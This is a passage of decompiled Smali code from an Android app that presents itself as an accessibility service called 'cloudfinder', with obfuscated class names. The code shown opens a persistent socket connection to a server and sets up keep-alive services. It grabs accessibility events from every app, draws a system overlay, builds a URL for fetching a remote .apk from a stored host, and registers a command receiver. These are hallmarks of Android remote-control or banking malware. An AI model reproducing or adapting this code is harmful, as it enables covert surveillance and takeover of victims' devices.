    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " submitted pkgs"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    const-string v6, "restoreSubmitted error"

    invoke-static {v3, v6, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_1
    sput-boolean v5, Lسۄھؤۏ۫/؋;->د:Z

    sput-boolean v5, Lسۄھؤۏ۫/؋;->ز:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    const-string v0, ">>> onServiceConnected called <<<"

    const-string v6, "MyAccessSvc"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "onServiceConnected"

    const-string v7, "normal"

    new-instance v8, Landroidx/room/أ;

    const/16 v9, 0x8

    invoke-direct {v8, v9, v0, v7, v1}, Landroidx/room/أ;-><init>(ILjava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V

    sget-object v0, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v0, v8}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    const/4 v7, 0x0

    :try_start_2
    const-string v0, "acc_on"

    invoke-static {v0, v1, v7}, Lڗًقڔ/ء;->ع(Ljava/lang/String;Landroid/content/Context;Lorg/json/JSONObject;)V

    invoke-static/range {p0 .. p0}, Lڗًقڔ/ء;->ػ(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    new-instance v0, Ljava/lang/Thread;

    new-instance v8, Lڝږ؁ڋ/ا;

    const/4 v9, 0x6

    invoke-direct {v8, v9}, Lڝږ؁ڋ/ا;-><init>(I)V

    invoke-direct {v0, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :try_start_3
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    invoke-virtual {v0, v1}, Lڜٟٱڀ/د;->ء(Landroid/content/Context;)V

    invoke-virtual {v0}, Lڜٟٱڀ/د;->؋()V

    const-string v0, "SocketManager init + connect from onServiceConnected"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_2

    :catch_3
    move-exception v0

    const-string v8, "SocketManager init error"

    invoke-static {v6, v8, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    invoke-static {}, Lڜٟٱڀ/ز;->آ()Lڜٟٱڀ/ز;

    move-result-object v0

    invoke-virtual {v0, v1}, Lڜٟٱڀ/ز;->؋(Landroid/content/Context;)V

    invoke-static/range {p0 .. p0}, Lcom/lite/cloudfinder/service/KeepAliveWorker;->schedule(Landroid/content/Context;)V

    :try_start_4
    new-instance v0, Landroid/content/Intent;

    const-class v8, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;

    invoke-direct {v0, v1, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_3

    :catch_4
    move-exception v0

    const-string v8, "Start FGS from onServiceConnected error"

    invoke-static {v6, v8, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    :try_start_5
    invoke-static/range {p0 .. p0}, Lںڍڒڸ/ش;->ټ(Landroid/content/Context;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_4

    :catch_5
    move-exception v0

    move-object v8, v0

    const-string v0, "NetworkMonitor start error"

    invoke-static {v6, v0, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_4
    :try_start_6
    invoke-static {}, Ljava/lang/Thread;->getDefaultUncaughtExceptionHandler()Ljava/lang/Thread$UncaughtExceptionHandler;

    move-result-object v0

    new-instance v8, Lڛڜڕڰڑ/ؠ;

    invoke-direct {v8, v0, v5}, Lڛڜڕڰڑ/ؠ;-><init>(Ljava/lang/Thread$UncaughtExceptionHandler;I)V

    invoke-static {v8}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    goto :goto_5

    :catch_6
    move-exception v0

    const-string v8, "UncaughtExceptionHandler error"

    invoke-static {v6, v8, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_5
    sput-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    const-string v0, "Default launcher: "

    const/high16 v8, 0x10000

    :try_start_7
    new-instance v9, Landroid/content/Intent;

    const-string v10, "android.intent.action.MAIN"

    invoke-direct {v9, v10}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v10, "android.intent.category.HOME"

    invoke-virtual {v9, v10}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    invoke-virtual {v10, v9, v8}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v9

    if-eqz v9, :cond_3

    iget-object v9, v9, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    if-eqz v9, :cond_3

    iget-object v9, v9, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    sput-object v9, Lڜٟٱڀ/ة;->ج:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v0, Lڜٟٱڀ/ة;->ج:Ljava/lang/String;

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_7

    goto :goto_6

    :catch_7
    move-exception v0

    const-string v9, "initLauncher error"

    invoke-static {v3, v9, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_3
    :goto_6
    sget-object v0, Lڜٟٱڀ/ت;->ؤ:Ljava/util/concurrent/ConcurrentHashMap;

    const-class v3, Lڜٟٱڀ/ت;

    monitor-enter v3

    :try_start_8
    sget-object v0, Lڜٟٱڀ/ت;->ب:Lڜٟٱڀ/ت;

    if-nez v0, :cond_4

    new-instance v0, Lڜٟٱڀ/ت;

    invoke-direct {v0}, Lڜٟٱڀ/ت;-><init>()V

    sput-object v0, Lڜٟٱڀ/ت;->ب:Lڜٟٱڀ/ت;

    :cond_4
    sget-object v0, Lڜٟٱڀ/ت;->ب:Lڜٟٱڀ/ت;
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    monitor-exit v3

    invoke-virtual {v0, v1}, Lڜٟٱڀ/ت;->ء(Landroid/content/Context;)V

    sget-boolean v0, Lںڍڒڸ/ش;->إ:Z

    const/16 v3, 0x1e

    const/4 v9, 0x1

    if-eqz v0, :cond_5

    goto :goto_7

    :cond_5
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-ge v0, v3, :cond_6

    goto :goto_7

    :cond_6
    sput-boolean v9, Lںڍڒڸ/ش;->إ:Z

    sget-object v0, Lںڍڒڸ/ش;->أ:Landroid/os/Handler;

    if-nez v0, :cond_7

    new-instance v0, Landroid/os/HandlerThread;

    const-string v10, "ThumbBg"

    invoke-direct {v0, v10}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    new-instance v10, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v10, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v10, Lںڍڒڸ/ش;->أ:Landroid/os/Handler;

    :cond_7
    sget-object v0, Lںڍڒڸ/ش;->ؤ:Ljava/util/concurrent/ExecutorService;

    if-nez v0, :cond_8

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lںڍڒڸ/ش;->ؤ:Ljava/util/concurrent/ExecutorService;

    :cond_8
    invoke-static {}, Lںڍڒڸ/ش;->ٸ()V

    const-string v0, "ThumbUp"

    const-string v10, "Started"

    invoke-static {v0, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_7
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v10

    invoke-direct {v0, v10}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v10, Lڛڜڕڰڑ/ء;

    invoke-direct {v10, v1, v5}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    const-wide/16 v11, 0x1f40

    invoke-virtual {v0, v10, v11, v12}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    sget-boolean v0, Lڝږ؁ڋ/ؼ;->؋:Z

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v10

    invoke-direct {v0, v10}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v10, Lةؽڗںۍټ٘/؋;

    invoke-direct {v10, v9}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    const-wide/32 v11, 0x15f90

    invoke-virtual {v0, v10, v11, v12}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    const-string v10, "config"

    invoke-virtual {v1, v10, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v11, "permFlowDone"

    invoke-interface {v0, v11, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v12

    const-string v13, "bat_unrestrict"

    const-string v14, "done"

    const-wide/16 v7, 0x0

    if-eqz v12, :cond_a

    :try_start_9
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v15

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v15, v3, v5}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v3
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_9

    move-object v15, v10

    :try_start_a
    iget-wide v9, v3, Landroid/content/pm/PackageInfo;->firstInstallTime:J

    invoke-interface {v0, v2, v7, v8}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v16
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_a

    cmp-long v3, v16, v7

    if-eqz v3, :cond_9

    cmp-long v3, v9, v16

    if-eqz v3, :cond_b

    :cond_9
    :try_start_b
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v11, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v2, v9, v10}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-virtual {v1, v13, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v14, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v0, "Reinstall detected, resetting setup"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_8

    :catch_8
    move v12, v5

    goto :goto_8

    :catch_9
    :cond_a
    move-object v15, v10

    :catch_a
    :cond_b
    :goto_8
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "SETUP_CHECK permAlreadyDone="

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v2, " sSetupComplete="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-boolean v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v12, :cond_d

    const/4 v2, 0x1

    sput-boolean v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    invoke-virtual {v1, v13, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0, v14, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_c

    const-string v3, "power"

    invoke-virtual {v1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    if-eqz v3, :cond_c

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_c

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const/4 v2, 0x1

    invoke-interface {v0, v14, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v0, "Battery optimization already disabled, marking done"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v2, 0x1

    :cond_c
    if-nez v2, :cond_d

    const-string v0, "permFlowDone=true but battery not done, running battery optimization"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lڛڜڕڰڑ/ء;

    const/4 v3, 0x1

    invoke-direct {v2, v1, v3}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_d
    if-nez v12, :cond_e

    :try_start_c
    goto :goto_9

    :catch_b
    move-exception v0

    move-object v2, v0

    const-string v0, "Permission overlay show error"

    invoke-static {v6, v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_e
    :goto_9
    sget-boolean v0, Lسۄھؤۏ۫/؋;->ث:Z

    if-eqz v0, :cond_11

    const/4 v2, 0x1

    sput-boolean v2, Lسۄھؤۏ۫/؋;->ب:Z

    :try_start_d
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_e

    move-object v2, v15

    :try_start_e
    invoke-virtual {v0, v2, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v3, "domain"

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_c

    goto :goto_a

    :catch_c
    move-object v0, v4

    :goto_a
    :try_start_f
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    const-string v9, ".apk"

    invoke-virtual {v3, v9}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_10

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "https://"

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "host"
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_e

    :try_start_10
    invoke-static {}, Lcom/lite/cloudfinder/App;->؋()Landroid/content/Context;

    move-result-object v10

    if-nez v10, :cond_f

    goto :goto_b

    :cond_f
    invoke-virtual {v10, v2, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2, v9, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_d

    :catch_d
    :goto_b
    :try_start_11
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/"

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "?t="

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    invoke-virtual {v3, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lcom/lite/cloudfinder/App;->؋()Landroid/content/Context;

    move-result-object v2

    const-string v3, "config"

    invoke-virtual {v2, v3, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "domainUrl"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    :goto_c
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto :goto_d

    :cond_10
    invoke-static {}, Lcom/lite/cloudfinder/App;->؋()Landroid/content/Context;

    move-result-object v0

    const-string v2, "config"

    invoke-virtual {v0, v2, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "domainUrl"

    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_e

    goto :goto_c

    :catch_e
    :cond_11
    :goto_d
    sput-boolean v5, Lسۄھؤۏ۫/؋;->ث:Z

    const/16 v2, 0x21

    :try_start_12
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1d

    if-lt v3, v4, :cond_12

    const/16 v9, 0x6fb

    goto :goto_e

    :cond_12
    const/16 v9, 0x2fb

    :goto_e
    const/16 v10, 0x1e

    if-lt v3, v10, :cond_13

    or-int/lit16 v9, v9, 0x1800

    :cond_13
    const/16 v10, 0x1f

    if-lt v3, v10, :cond_14

    or-int/lit16 v9, v9, 0x2000

    :cond_14
    if-lt v3, v2, :cond_15

    const v10, 0x8000

    or-int/2addr v9, v10

    :cond_15
    const/16 v10, 0x22

    if-lt v3, v10, :cond_16

    const/high16 v10, 0x10000

    or-int/2addr v9, v10

    :cond_16
    iput v9, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    const/4 v10, -0x1

    iput v10, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    iput-wide v7, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    const/4 v7, 0x0

    iput-object v7, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->packageNames:[Ljava/lang/String;

    if-lt v3, v4, :cond_17

    invoke-static {v0}, Lزءؽ۴ڰؠ/؋;->ؤ(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    invoke-static {v0}, Lزءؽ۴ڰؠ/؋;->ت(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    :cond_17
    iput v10, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ServiceInfo flags=0x"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " touchExploration="

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    and-int/lit16 v3, v9, 0x100

    if-eqz v3, :cond_18

    const/4 v3, 0x1

    goto :goto_f

    :cond_18
    move v3, v5

    :goto_f
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_f

    goto :goto_10

    :catch_f
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_10
    :try_start_13
    const-string v0, "window"

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    new-instance v3, Lڛڜڕڰڑ/أ;

    invoke-direct {v3, v1, v1, v5}, Lڛڜڕڰڑ/أ;-><init>(Ljava/lang/Object;Landroid/content/Context;I)V

    new-instance v4, Landroid/view/WindowManager$LayoutParams;

    const/16 v17, 0x1

    const/16 v18, 0x1

    const/16 v19, 0x7f0

    const v20, 0xc0018

    const/16 v21, -0x3

    move-object/from16 v16, v4

    invoke-direct/range {v16 .. v21}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const v5, 0x800033

    iput v5, v4, Landroid/view/WindowManager$LayoutParams;->gravity:I

    invoke-interface {v0, v3, v4}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_10

    goto :goto_11

    :catch_10
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_11
    new-instance v0, Ljava/lang/Thread;

    new-instance v3, Lژة۪ڦضۆۿۡ/ظ;

    invoke-direct {v3, v1}, Lژة۪ڦضۆۿۡ/ظ;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    const/4 v0, 0x2

    if-nez v12, :cond_19

    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lڛڜڕڰڑ/ء;

    invoke-direct {v4, v1, v0}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    :cond_19
    iget-object v3, v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    if-eqz v3, :cond_1a

    :try_start_14
    invoke-virtual {v1, v3}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_11

    :catch_11
    const/4 v3, 0x0

    iput-object v3, v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    :cond_1a
    new-instance v3, Lژة۪ڦضۆۿۡ/ط;

    const/4 v4, 0x1

    invoke-direct {v3, v1, v4}, Lژة۪ڦضۆۿۡ/ط;-><init>(Landroid/content/ContextWrapper;I)V

    iput-object v3, v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    new-instance v3, Landroid/content/IntentFilter;

    const-string v4, "com.example.TEST_CMD"

    invoke-direct {v3, v4}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v4, v2, :cond_1b

    iget-object v2, v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    invoke-virtual {v1, v2, v3, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)Landroid/content/Intent;

    goto :goto_12

    :cond_1b
    iget-object v0, v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    invoke-virtual {v1, v0, v3}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    :goto_12
    const-string v0, "TestCmd receiver registered"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :catchall_0
    move-exception v0

    monitor-exit v3

    throw v0
.end method

.method public final onSystemActionsChanged()V
    .locals 0

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onSystemActionsChanged()V

    return-void
.end method

.method public final onUnbind(Landroid/content/Intent;)Z
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Service;->onUnbind(Landroid/content/Intent;)Z

    move-result p1

    return p1
.end method

.method public final ؋(Ljava/lang/String;)V
    .locals 11

    sget-boolean v0, Lسۄھؤۏ۫/؋;->ز:Z

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getWindows()Ljava/util/List;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

